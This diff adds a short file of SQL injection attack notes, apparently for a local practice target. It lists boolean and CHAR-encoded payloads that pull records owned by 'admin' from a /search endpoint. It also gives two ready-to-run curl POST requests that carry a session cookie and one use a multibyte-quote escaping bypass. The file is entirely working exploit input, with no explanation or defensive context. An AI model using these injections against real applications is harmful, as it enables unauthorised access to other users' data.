@@ -1,0 +1,19 @@
+
+/search
+
+Title: 0 or 1=1
+
+Title: 0 OR owner=CHAR(97,100,109,105,110)
+
+
+curl -i -s -X POST http://localhost:3000/search \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -b "session=eyJ1c2VyIjoidGVzdCJ9.abmICw.cwNIDHwjvzLUKEiVTWGxdb3WKfw" \
+  --data-urlencode "title=0 OR owner=CHAR(97,100,109,105,110)" \
+  --data-urlencode "tag=x"
+
+curl -i -s -X POST http://localhost:3000/search \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -b "session=eyJ1c2VyIjoidGVzdCJ9.abmICw.cwNIDHwjvzLUKEiVTWGxdb3WKfw" \
+  --data-urlencode "title=%bf%27 OR owner=CHAR(97,100,109,105,110) -- " \
+  --data-urlencode "tag=x"
